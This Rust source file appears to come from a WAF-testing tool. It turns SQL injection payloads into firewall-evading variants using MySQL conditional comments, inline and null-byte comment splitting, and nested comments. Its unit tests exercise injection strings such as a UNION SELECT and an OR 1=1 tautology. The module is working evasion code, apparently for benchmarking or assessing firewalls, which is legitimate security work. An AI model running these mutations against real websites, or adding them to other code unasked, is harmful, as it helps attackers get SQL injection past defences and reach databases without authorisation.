//! Comment-based keyword mutation helpers.
//!
//! SQL comments are the most reliable WAF bypass primitive. Every SQL engine
//! supports `/* ... */` and `--`, and most WAFs fail to handle:
//! - Nested comments (`/* /* */ */`)
//! - Inline comments between characters (`S/**/E/**/L/**/E/**/C/**/T`)
//! - MySQL version comments (`/*!50000 SELECT */`)
//! - Comment-as-whitespace (`UNION/**/SELECT`)
//! - Mixed comment styles within a single statement

const SQL_KEYWORDS: &[&str] = &[
    "SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "DROP", "WHERE", "FROM", "ORDER", "GROUP",
    "AND", "OR", "HAVING", "LIKE", "BETWEEN", "JOIN", "INTO",
];

/// Wrap a SQL keyword in a `MySQL` conditional comment.
pub(crate) fn mysql_conditional_comment(keyword: &str) -> String {
    format!("/*!{keyword}*/")
}

/// Split a keyword by inserting inline comments between each character.
///
/// `SELECT` → `S/**/E/**/L/**/E/**/C/**/T`
///
/// **MySQL / MariaDB ONLY.** Inline comments are treated as
/// whitespace IN THE MIDDLE OF AN IDENTIFIER on those engines.
/// PostgreSQL, MSSQL, Oracle, and SQLite all treat
/// `S/**/E/**/L/**/E/**/C/**/T` as six separate identifiers — the
/// keyword `SELECT` no longer parses and the query 500s. The
/// `mutate()` caller MUST gate this transform on a MySQL/MariaDB
/// dialect tag; firing it against any other backend produces a
/// payload that fails server-side rather than bypassing the WAF.
pub(crate) fn inline_comment_split(keyword: &str) -> String {
    keyword
        .chars()
        .map(|c| c.to_string())
        .collect::<Vec<_>>()
        .join("/**/")
}

/// Split a keyword using null-byte comments.
///
/// `SELECT` → `S/*%00*/E/*%00*/L/*%00*/E/*%00*/C/*%00*/T`
pub(crate) fn null_comment_split(keyword: &str) -> String {
    keyword
        .chars()
        .map(|c| c.to_string())
        .collect::<Vec<_>>()
        .join("/*%00*/")
}

/// Build `MySQL`-dialect keyword comment mutations for the payload.
///
/// **DIALECT CONTRACT.** Every output of this function is MySQL /
/// MariaDB ONLY. Both strategies it emits — `mysql_conditional_comment`
/// (`/*!keyword*/`) and `inline_comment_split` (`S/**/E/**/L/**/E/**/C/**/T`)
/// — are MySQL-specific syntax. PostgreSQL, MSSQL, Oracle, and
/// SQLite REJECT the output: the conditional comment is treated
/// as a regular comment (entire keyword stripped) on non-MySQL
/// and the inline split parses as multiple separate identifiers.
///
/// Callers MUST gate on detected dialect. The pipeline currently
/// doesn't always have a dialect — when it doesn't, prefer
/// dialect-agnostic mutations (case-mixing, encoding) over this
/// family. Firing this against a non-MySQL target produces a
/// payload that fails server-side rather than bypassing the WAF
/// — bench numbers look worse than they should AND the operator
/// gets a `Verdict::Blocked` that's actually a `Verdict::Errored`.
pub(crate) fn keyword_comment_mutations(
    payload: &str,
    max_mutations: usize,
) -> Vec<(String, String)> {
    let lower = payload.to_ascii_lowercase();
    let mut results = Vec::new();

    for keyword in SQL_KEYWORDS {
        if results.len() >= max_mutations {
            break;
        }

        if let Some(position) = lower.find(&keyword.to_ascii_lowercase()) {
            let original = &payload[position..position + keyword.len()];

            // Strategy 1: MySQL conditional comment
            let wrapped = mysql_conditional_comment(keyword);
            let mutated = payload.replacen(original, &wrapped, 1);
            if mutated != payload {
                results.push((
                    mutated,
                    format!("MySQL conditional comment: {keyword} → {wrapped}"),
                ));
            }

            // Strategy 2: Inline comment splitting
            if results.len() < max_mutations {
                let split = inline_comment_split(keyword);
                let mutated = payload.replacen(original, &split, 1);
                if mutated != payload {
                    results.push((
                        mutated,
                        format!("Inline comment split: {keyword} → {split}"),
                    ));
                }
            }

            // Strategy 3: Null-byte comment splitting
            if results.len() < max_mutations {
                let split = null_comment_split(keyword);
                let mutated = payload.replacen(original, &split, 1);
                if mutated != payload {
                    results.push((mutated, format!("Null-byte comment split: {keyword}")));
                }
            }
        }
    }

    results
}

/// Build version-targeted `MySQL` keyword comment mutations for the payload.
pub(crate) fn version_comment_mutations(
    payload: &str,
    max_mutations: usize,
) -> Vec<(String, String)> {
    let lower = payload.to_ascii_lowercase();
    let mut results = Vec::new();

    for keyword in SQL_KEYWORDS {
        if let Some(position) = lower.find(&keyword.to_ascii_lowercase()) {
            let original = &payload[position..position + keyword.len()];
            // Test multiple MySQL version numbers — different versions expose different behavior
            for version in ["50000", "40000", "99999", "50001", "40100"] {
                if results.len() >= max_mutations {
                    return results;
                }

                let wrapped = format!("/*!{version}{keyword}*/");
                let mutated = payload.replacen(original, &wrapped, 1);
                if mutated != payload {
                    results.push((
                        mutated,
                        format!("MySQL version conditional: /*!{version}{keyword}*/"),
                    ));
                }
            }
        }
    }

    results
}

/// Build nested comment mutations — exploits WAFs that strip first comment layer.
///
/// `SELECT` → `/**/SELECT/**/` → `/* /**/ */ SELECT /* /**/ */`
pub(crate) fn nested_comment_mutations(
    payload: &str,
    max_mutations: usize,
) -> Vec<(String, String)> {
    let lower = payload.to_ascii_lowercase();
    let mut results = Vec::new();

    for keyword in SQL_KEYWORDS {
        if results.len() >= max_mutations {
            break;
        }

        if let Some(position) = lower.find(&keyword.to_ascii_lowercase()) {
            let original = &payload[position..position + keyword.len()];

            // Nested comment: if WAF strips outer comments, keyword survives
            let nested = format!("/*/**/*/{keyword}/*/**/ */");
            let mutated = payload.replacen(original, &nested, 1);
            if mutated != payload {
                results.push((mutated, format!("Nested comment: {keyword} → {nested}")));
            }

            // Empty comment padding
            if results.len() < max_mutations {
                let padded = format!("/**/{keyword}/**/");
                let mutated = payload.replacen(original, &padded, 1);
                if mutated != payload {
                    results.push((mutated, format!("Comment-padded: {keyword} → {padded}")));
                }
            }
        }
    }

    results
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn inline_split_select() {
        assert_eq!(inline_comment_split("SELECT"), "S/**/E/**/L/**/E/**/C/**/T");
    }

    #[test]
    fn inline_split_union() {
        assert_eq!(inline_comment_split("UNION"), "U/**/N/**/I/**/O/**/N");
    }

    #[test]
    fn null_split_select() {
        assert_eq!(
            null_comment_split("SELECT"),
            "S/*%00*/E/*%00*/L/*%00*/E/*%00*/C/*%00*/T"
        );
    }

    #[test]
    fn keyword_comment_mutations_produces_variants() {
        let mutations = keyword_comment_mutations("' UNION SELECT 1--", 50);
        // Should produce at least conditional + inline + null for both UNION and SELECT
        assert!(
            mutations.len() >= 4,
            "should produce multiple comment variants, got {}",
            mutations.len()
        );
    }

    #[test]
    fn keyword_comment_mutations_inline_split() {
        let mutations = keyword_comment_mutations("' UNION SELECT 1--", 50);
        assert!(
            mutations
                .iter()
                .any(|(m, _)| m.contains("U/**/N/**/I/**/O/**/N")),
            "should include inline comment split for UNION"
        );
    }

    #[test]
    fn version_comment_mutations_multiple_versions() {
        let mutations = version_comment_mutations("' UNION SELECT 1--", 50);
        assert!(mutations.iter().any(|(_, d)| d.contains("50000")));
        assert!(mutations.iter().any(|(_, d)| d.contains("40000")));
        assert!(mutations.iter().any(|(_, d)| d.contains("99999")));
    }

    #[test]
    fn nested_comment_mutations_exist() {
        let mutations = nested_comment_mutations("' SELECT 1--", 10);
        assert!(
            !mutations.is_empty(),
            "should produce nested comment variants"
        );
    }

    #[test]
    fn mutations_dont_panic_on_empty() {
        let mutations = keyword_comment_mutations("", 10);
        assert!(mutations.is_empty());
    }

    #[test]
    fn extended_keyword_list_includes_and_or() {
        let mutations = keyword_comment_mutations("' OR 1=1 AND 1=1--", 50);
        assert!(
            mutations
                .iter()
                .any(|(_, d)| d.contains("OR") || d.contains("AND")),
            "should mutate AND/OR keywords"
        );
    }
}
